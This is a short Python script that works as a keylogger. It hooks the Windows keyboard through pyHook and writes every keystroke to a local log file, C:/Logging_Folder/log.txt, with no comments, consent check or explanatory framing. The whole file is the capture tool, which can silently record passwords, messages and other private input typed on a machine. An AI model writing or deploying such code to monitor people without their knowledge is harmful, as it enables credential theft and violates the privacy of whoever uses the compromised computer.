import pyHook
import pythoncom
import sys
import logging

file_log = r'C:/Logging_Folder/log.txt'


def OnKeyBoardEvent(event):
    logging.basicConfig(filename=file_log,
                        level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True


hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyBoardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
